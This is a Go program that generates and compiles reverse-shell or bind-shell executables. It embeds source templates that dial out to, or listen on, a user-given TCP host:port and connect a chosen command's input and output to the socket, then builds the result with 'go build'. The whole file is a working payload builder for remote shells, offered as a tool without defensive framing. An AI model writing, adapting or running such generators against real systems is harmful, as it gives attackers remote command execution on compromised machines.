package main

import (
	"bytes"
	"fmt"
	"io"
	"log"
	"os"
	"os/exec"
	"strings"
)

const (
	dependencies = `
import (
	"io"
	"net"
	"os/exec"
)
`
	reverseShellCode = `
func Connect(address string, command string, arguments []string) {
	connection, connectionError := net.Dial("tcp", address)
	if connectionError != nil {
		return
	}
	Execute(command, arguments, connection, connection, connection)
}
`

	bindShellCode = `
func Connect(address string, command string, arguments []string) {
	listener, listenError := net.Listen("tcp", address)
	if listenError != nil {
		return
	}
	connection, connectionError := listener.Accept()
	if connectionError != nil {
		return
	}
	Execute(command, arguments, connection, connection, connection)
}`

	template = `package main

%s

%s

func Execute(cmd string, arguments []string, stdin io.Reader, stdout io.Writer, stderr io.Writer) {
	command := exec.Cmd{
		Path:   cmd,
		Args:   arguments,
		Stdin:  stdin,
		Stdout: stdout,
		Stderr: stderr,
	}
	command.Run()
}

func main() {
	Connect("%s", "%s", []string{%s})
}`
)

func main() {
	if len(os.Args) < 4 {
		_, _ = fmt.Fprintf(os.Stderr, "%s output [bind|reverse] host:port command arguments", os.Args[0])
		return
	}
	var (
		connectionFunction string
		arguments          string
	)
	switch os.Args[2] {
	case "bind":
		connectionFunction = bindShellCode
	case "reverse":
		connectionFunction = reverseShellCode
	default:
		_, _ = fmt.Fprintf(os.Stderr, "Unknown connection type \"%s\", available are \"bind\" and \"reverse\"", os.Args[2])
		return
	}
	first := true
	for _, argument := range os.Args[5:] {
		if first {
			first = false
		} else {
			arguments += ", "
		}
		arguments += argument
	}
	directoryName, creationError := os.MkdirTemp("", "*")

	var codeFile *os.File
	codeFile, creationError = os.CreateTemp(directoryName, "*.go")
	if creationError != nil {
		log.Fatal(creationError)
	}
	sourceCode := fmt.Sprintf(template, dependencies, connectionFunction, os.Args[3], os.Args[4], arguments)
	defer os.Remove(codeFile.Name())
	_, writeError := codeFile.Write([]byte(sourceCode))
	if writeError != nil {
		log.Fatal(writeError)
	}
	closeError := codeFile.Close()
	if closeError != nil {
		log.Fatal(closeError)
	}

	if closeError != nil {
		log.Fatal(closeError)
	}
	codeFileName := strings.ReplaceAll(codeFile.Name(), "\\", "/")
	executableName := strings.ReplaceAll(os.Args[1], "\\", "/")
	command := exec.Command("go", "build", "-o", executableName, codeFileName)
	command.Stderr = &bytes.Buffer{}
	executionError := command.Run()
	if executionError != nil {
		_, _ = io.Copy(os.Stderr, command.Stderr.(*bytes.Buffer))
		log.Fatal(executionError)
	}
}
